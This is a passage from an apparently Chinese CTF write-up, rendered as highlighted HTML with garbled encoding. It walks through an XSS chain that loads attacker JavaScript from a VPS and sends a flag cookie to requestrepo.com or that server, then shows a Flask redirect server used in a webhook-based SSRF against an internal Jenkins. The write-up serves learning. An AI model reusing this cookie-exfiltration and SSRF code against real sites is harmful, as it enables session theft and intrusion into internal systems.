function_">map</span>(<span class="function">(<span class="params">[k, v]</span>) =&gt;</span> <span class="string">`<span class="subst">$&#123;k&#125;</span>=<span class="subst">$&#123;v&#125;</span>`</span>).<span class="title function_">join</span>(<span class="string">&#x27;; &#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123; code &#125;)</span><br><span class="line">    &#125;)).<span class="title function_">text</span>()</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;ok&#x27;</span> == data) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, <span class="title function_">sign</span>(&#123; username, <span class="attr">isVip</span>: <span class="literal">true</span> &#125;))</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Congratulation! You are VIP now.&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªvisit,æ‰“å¼€æµè§ˆå™¨è®¿é—®,ğŸªé‡Œé¢æ˜¯æºå¸¦ç€flag,æ‰€ä»¥ğŸ‘´è¦æ‹¿åˆ°è¿™ä¸ªğŸª.</p><p>ä½†æ˜¯flagä¸ä¸€å®šèƒ½å¤Ÿä¼ æ¥,è€Œvipè·¯ç”±èƒ½å¤Ÿå¼ºåˆ¶è®©Cookieæºå¸¦å°±å¾ˆå¥½âœŒ</p><p>ä¸è¿‡ç›´æ¥è®¿é—®æ˜¯æ‹¿ä¸åˆ°çš„,æ€ä¹ˆåŠæ,xssè¿‡æ¥!</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shareè·¯ç”±<span class="keyword">new</span> urlè®¿é—®-&gt;<span class="regexp">/previewè·¯ç”±è¿›è¡Œnew url xss-&gt;åŠ è½½vpsæ¶æ„js-&gt;ä»¥å¸¦ğŸªçš„èº«ä»½è®¿é—®/</span>loginå’Œ/vip,è§¦å‘vipçš„fetchè®¿é—®-&gt;å°†ğŸªæ•°æ®è½¬åˆ°xsså¹³å°.</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨urlencode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/share/%2e%2e%2f%<span class="number">70</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">76</span>%<span class="number">69</span>%<span class="number">65</span>%<span class="number">77</span>%3f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%3d%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">26</span>%<span class="number">74</span>%<span class="number">68</span>%<span class="number">65</span>%6d%<span class="number">65</span>%3d%2f%2f%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">39</span>%<span class="number">32</span>%2e%<span class="number">31</span>%<span class="number">39</span>%3a%<span class="number">31</span>%<span class="number">31</span>%<span class="number">34</span>%<span class="number">35</span></span><br><span class="line">/share/../preview?tex=awdadawd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></table></figure><p>ç›®å½•ç©¿è¶Šå¤§æ³•è®¿é—®preview,è‡³äºä¸ºå•¥ç”¨urlç¼–ç ,å› ä¸ºæ˜¯æ¥åœ¨è·¯å¾„ä¹‹åçš„,å®¹æ˜“è¢«è§£ææˆè·¯å¾„è€Œä¸æ˜¯ä¼ é€’çš„å‚æ•°.</p><p>jsä¸Šæ”¾ä¸¶ä¸œè¥¿</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">&#x27;/vip&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;//z08vedyv.requestrepo.com&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;7bbf4ac9596b5662b44db993bd8050dd&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> changshu = &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123; <span class="attr">code</span>: <span class="string">&quot;awdawdwadwadwadwa&quot;</span> &#125;),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œä½ å¯ä»¥å¤„ç†vipResponse</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œå¤„ç†ç™»å½•å¤±è´¥çš„æƒ…å†µ</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ğŸ‘´çˆ±ä½¿ç”¨<a href="https://www.requestrepo.com/">Dashboard - requestrepo.com</a> æ”¶cookies</p><p>cnmä¸å¥½ç”¨,è¿˜æ˜¯vpså¾—åŠ²</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030181708.png" alt="å¾®ä¿¡æˆªå›¾_20231030181708"></p><p>eeeeeeeeeeeeeeez,ã‚‚ã‚ã„ã‚‚ã‚ã„ã€‚</p><p>æœ€å¾Œã®exp æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">&#x27;/vip&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;//43.143.192.19:7777&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;9aaf577e773320b3548fdc5f37aa6e74&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> changshu = &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123; <span class="attr">code</span>: <span class="string">&quot;awdawdwadwadwadwa&quot;</span> &#125;),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œä½ å¯ä»¥å¤„ç†vipResponse</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œå¤„ç†ç™»å½•å¤±è´¥çš„æƒ…å†µ</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç°åœ¨,ğŸ‘´å°±æ˜¯æ–°ä¸–ç•Œã®å¡å¯†.</p><h1 id="hooks"><span id="hooks"> hooks</span></h1><p><a href="https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/">https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/</a></p><h2 id="what-is-webhook"><span id="what-is-webhook"> what is webhookğŸ¤”</span></h2><p>Webhook æ˜¯ä¸€ç§é€šè¿‡ HTTP åè®®å®ç°çš„å›è°ƒæœºåˆ¶ï¼Œç”¨äºå°†å®æ—¶äº‹ä»¶å’Œæ•°æ®ä»ä¸€ä¸ªåº”ç”¨ç¨‹åºä¼ é€’åˆ°å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚Webhook å…è®¸åº”ç”¨ç¨‹åºåœ¨ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶è‡ªåŠ¨é€šçŸ¥å…¶ä»–åº”ç”¨ç¨‹åºï¼Œè¿™ç§é€šçŸ¥æ˜¯é€šè¿‡ HTTP POST è¯·æ±‚è¿›è¡Œçš„ã€‚å®ƒæ˜¯ä¸€ç§ç”¨äºå®ç°å®æ—¶é€šä¿¡å’Œæ•°æ®ä¼ é€’çš„è½»é‡çº§æœºåˆ¶ã€‚</p><p>ä»¥ä¸‹æ˜¯ Webhook çš„ä¸»è¦ç‰¹ç‚¹å’Œç”¨é€”ï¼š</p><p>äº‹ä»¶é©±åŠ¨é€šçŸ¥ï¼š Webhook ä¸»è¦ç”¨äºäº‹ä»¶é©±åŠ¨çš„é€šçŸ¥ï¼Œä¾‹å¦‚æ–°çš„è®¢å•ã€æ–°çš„æ¶ˆæ¯ã€çŠ¶æ€æ›´æ”¹ç­‰ã€‚å½“ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæºåº”ç”¨ç¨‹åºå°†å‘é€ HTTP POST è¯·æ±‚åˆ°ç›®æ ‡åº”ç”¨ç¨‹åºçš„ Webhook URLï¼Œé€šçŸ¥ç›®æ ‡åº”ç”¨ç¨‹åºè¿›è¡Œå“åº”ã€‚</p><p>å®æ—¶æ€§ï¼š Webhook é€šå¸¸å…·æœ‰ä½å»¶è¿Ÿï¼Œå› ä¸ºå®ƒä»¬æ˜¯å³æ—¶è§¦å‘çš„ã€‚å½“äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œé€šçŸ¥ç«‹å³å‘é€ï¼Œè€Œä¸éœ€è¦è½®è¯¢æˆ–å®šæœŸæ£€æŸ¥ã€‚</p><p>è‡ªåŠ¨åŒ–ï¼š Webhook å…è®¸è‡ªåŠ¨åŒ–å¤„ç†äº‹ä»¶å’Œæ•°æ®ï¼Œå‡å°‘äº†æ‰‹åŠ¨å¹²é¢„çš„éœ€è¦ã€‚è¿™å¯¹äºé›†æˆä¸åŒåº”ç”¨ç¨‹åºã€è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹å’Œæé«˜æ•ˆç‡éå¸¸æœ‰ç”¨ã€‚</p><p>æ‰©å±•æ€§ï¼š Webhook å¯ä»¥ä¸å„ç§ä¸åŒç±»å‹çš„åº”ç”¨ç¨‹åºå’ŒæœåŠ¡é›†æˆï¼Œä½¿å…¶å…·æœ‰å¾ˆé«˜çš„çµæ´»æ€§å’Œæ‰©å±•æ€§ã€‚</p><p>æ•°æ®ä¼ é€’ï¼š Webhook å¯ä»¥ä¼ é€’å„ç§æ•°æ®æ ¼å¼ï¼ŒåŒ…æ‹¬ JSONã€XMLã€è¡¨å•æ•°æ®ç­‰ï¼Œè¿™ä½¿å¾—å®ƒä»¬é€‚ç”¨äºå¤šç§åº”ç”¨åœºæ™¯ã€‚</p><p>é‡ç‚¹ğŸ¤ª:webhook åªå…è®¸æˆ‘ä»¬å‘é€ POST è¯·æ±‚,æ²¡æ³•æ§åˆ¶è¯·æ±‚çš„body,ç”šè‡³æ²¡æœ‰csrfçš„tokenğŸ˜“</p><h2 id="abusing-jenkins-login"><span id="abusing-jenkins-login"> Abusing Jenkins login</span></h2><p>ä¸è¯´äººè¯:</p><p>Jenkins æ˜¯ä¸€ä¸ªå¼€æºçš„è‡ªåŠ¨åŒ–æœåŠ¡å™¨ï¼Œç”¨äºæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²è½¯ä»¶é¡¹ç›®ã€‚å®ƒæä¾›äº†ä¸€ä¸ªçµæ´»çš„å¹³å°ï¼Œä½¿å›¢é˜Ÿèƒ½å¤Ÿè‡ªåŠ¨åŒ–æ•´ä¸ªè½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­çš„å„ç§ä»»åŠ¡ã€‚ä»¥ä¸‹æ˜¯ Jenkins çš„ä¸»è¦ç‰¹ç‚¹å’Œç”¨é€”ï¼š</p><p>æŒç»­é›†æˆ (CI) å’ŒæŒç»­äº¤ä»˜ (CD)ï¼š Jenkins é€šè¿‡è‡ªåŠ¨åŒ–æ„å»ºå’Œæµ‹è¯•è¿‡ç¨‹ï¼Œæ”¯æŒæŒç»­é›†æˆå’ŒæŒç»­äº¤ä»˜ï¼Œä½¿å›¢é˜Ÿèƒ½å¤Ÿé¢‘ç¹åœ°ã€å¯é åœ°äº¤ä»˜è½¯ä»¶ã€‚</p><p>æ’ä»¶ç”Ÿæ€ç³»ç»Ÿï¼š Jenkins å…·æœ‰å¼ºå¤§çš„æ’ä»¶ç”Ÿæ€ç³»ç»Ÿï¼Œå…è®¸ç”¨æˆ·è½»æ¾åœ°æ‰©å±•å…¶åŠŸèƒ½ã€‚æœ‰æ•°åƒä¸ªå¯ç”¨çš„æ’ä»¶ï¼Œç”¨äºä¸å„ç§å·¥å…·å’ŒæŠ€æœ¯è¿›è¡Œé›†æˆã€‚</p><p>åˆ†å¸ƒå¼æ„å»ºï¼š Jenkins æ”¯æŒåˆ†å¸ƒå¼æ„å»ºï¼Œå¯ä»¥å°†æ„å»ºä»»åŠ¡åˆ†å‘åˆ°å¤šä¸ªæ„å»ºä»£ç† (Nodes)ï¼Œä»¥æé«˜æ„å»ºæ€§èƒ½å’Œå¯æ‰©å±•æ€§ã€‚</p><p>è‡ªåŠ¨åŒ–éƒ¨ç½²ï¼š Jenkins å¯ä»¥ä¸å„ç§éƒ¨ç½²å·¥å…·å’Œäº‘å¹³å°é›†æˆï¼Œæ”¯æŒè‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°ä¸åŒç¯å¢ƒï¼ŒåŒ…æ‹¬å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒã€‚</p><p>å¯è§†åŒ–ç•Œé¢ï¼š Jenkins æä¾›ç›´è§‚çš„ Web ç”¨æˆ·ç•Œé¢ï¼Œç”¨äºç®¡ç†æ„å»ºä»»åŠ¡ã€æŸ¥çœ‹æ„å»ºå†å²å’Œç”ŸæˆæŠ¥å‘Šã€‚</p><p>å¤šç§æ„å»ºå·¥å…·æ”¯æŒï¼š Jenkins å¯ä»¥ä¸å„ç§æ„å»ºå·¥å…·é›†æˆï¼ŒåŒ…æ‹¬ Apache Antã€Mavenã€Gradle ç­‰ã€‚</p><p>å¤šè¯­è¨€æ”¯æŒï¼š Jenkins æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€å’ŒæŠ€æœ¯æ ˆï¼Œä½¿å…¶é€‚ç”¨äºå„ç§é¡¹ç›®ã€‚</p><p>å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶ï¼š Jenkins å…·æœ‰å¼ºå¤§çš„å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶åŠŸèƒ½ï¼Œå¯ä»¥ç®¡ç†ç”¨æˆ·å’Œè§’è‰²çš„è®¿é—®æƒé™ã€‚</p><p>æ—¥å¿—è®°å½•å’ŒæŠ¥å‘Šï¼š Jenkins ç”Ÿæˆè¯¦ç»†çš„æ„å»ºæ—¥å¿—å’ŒæŠ¥å‘Šï¼Œä»¥ä¾¿è¯Šæ–­é—®é¢˜å’Œè¿½è¸ªæ„å»ºè¿›åº¦ã€‚</p><p>æ´»è·ƒçš„ç¤¾åŒºå’Œæ”¯æŒï¼š Jenkins æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæœ‰ä¸€ä¸ªæ´»è·ƒçš„ç¤¾åŒºï¼Œæä¾›æ”¯æŒã€æ–‡æ¡£å’Œæ’ä»¶ã€‚</p><p>è¯´äººè¯:ğŸ‘´ä¹Ÿä¸çŸ¥é“</p><p>ä¸€ç§ç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ï¼Œä»ç™»å½•é¡µé¢å¼€å§‹ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ç”¨æˆ·å‡­æ®ï¼Œå› ä¸º Jenkins ç”¨æˆ·åœ¨å…¶è‡ªå·±çš„ç”¨æˆ·æ•°æ®åº“ä¸­è¿›è¡Œç®¡ç†ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–ç¼ºä¹åŸºæœ¬ä¿æŠ¤ï¼ˆä¾‹å¦‚å¯†ç ç­–ç•¥æˆ–é’ˆå¯¹è‡ªåŠ¨åŒ–çš„ä¿æŠ¤ï¼‰çš„ç”¨æˆ·ç®¡ç†æ–¹æ³•ï¼Œè¿™æ˜¯å¾ˆå¸¸è§çš„ã€‚(æœºç¿»,ğŸ‘´çœ‹ä¸æ‡‚ğŸæ–‡)</p><p>æ€»è€Œè¨€ä¹‹å°±æ˜¯,é€šè¿‡githubæˆ–gitlabçš„webhooksç»è¿‡pythonä¸­è½¬,æ‰“åˆ°é¢˜ç›®çš„å†…ç½‘.</p><p>ğŸ‘´çœŸtmæ˜¯ä¸ªsb,çœ‹ä¸ªæ–‡ç« æ²¡çœ‹å…¨,æŠŠä¸€éƒ¨åˆ†expæ‹¿å»æ‰“,æ­»æ´»æ‰“ä¸é€š,åæ¥é—®â›°ğŸŒŠgiegie,æ‰çŸ¥é“è¦é€šè¿‡pythonå†™ä¸ªé‡å®šå‘ä¸­è½¬æ‰èƒ½æœ‰å›æ˜¾,è¯´æ˜¯æœ‰è§†é¢‘æ¼”ç¤º,ğŸ‘´tmğŸ‡äº†,æ²¡è¿™ä¹ˆsbå§,é˜¿ç±³è¯ºæ–¯.</p><h2 id="å¼€æ‰“"><span id="å¼€æ‰“"> å¼€æ‰“ğŸ˜¤</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/evil&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://124.70.33.170:8088/redirect?redirect_url=http://jenkins:8080/&quot;</span>,code=<span class="number">302</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031084325.png" alt="å¾®ä¿¡æˆªå›¾_20231031084325"></p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031081144.png" alt="å¾®ä¿¡æˆªå›¾_20231031081144"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head resURL=<span class="string">&quot;/static/e1c81722&quot;</span> data-rooturl=<span class="string">&quot;&quot;</span> data-resurl=<span class="string">&quot;/static/e1c81722&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Dashboard [Jenkins]&lt;/title&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/layout-common.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/style.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/color.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/css/responsive-grid.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;shortcut icon&quot;</span> href=<span class="string">&quot;/static/e1c81722/favicon.ico&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;image/vnd.microsoft.icon&quot;</span> /&gt;&lt;link color=<span class="string">&quot;black&quot;</span> rel=<span class="string">&quot;mask-icon&quot;</span> href=<span class="string">&quot;/images/mask-icon.svg&quot;</span> /&gt;&lt;script&gt;var isRunAsTest=false; var rootURL=<span class="string">&quot;&quot;</span>; var resURL=<span class="string">&quot;/static/e1c81722&quot;</span>;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/prototype.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/behavior.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&#x27;/adjuncts/e1c81722/org/kohsuke/stapler/bind.js&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/yahoo/yahoo-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/dom/dom-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/event/event-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/animation/animation-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/dragdrop/dragdrop-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/container/container-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/connection/connection-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/datasource/datasource-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/autocomplete/autocomplete-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/menu/menu-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/element/element-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/button/button-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/storage/storage-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/hudson-behavior.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/sortable.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;script&gt;crumb.init(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);&lt;/script&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/container/assets/container.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/assets/skins/sam/skin.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/container/assets/skins/sam/container.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/button/assets/skins/sam/button.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/e1c81722/scripts/yui/menu/assets/skins/sam/menu.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;&lt;link rel=<span 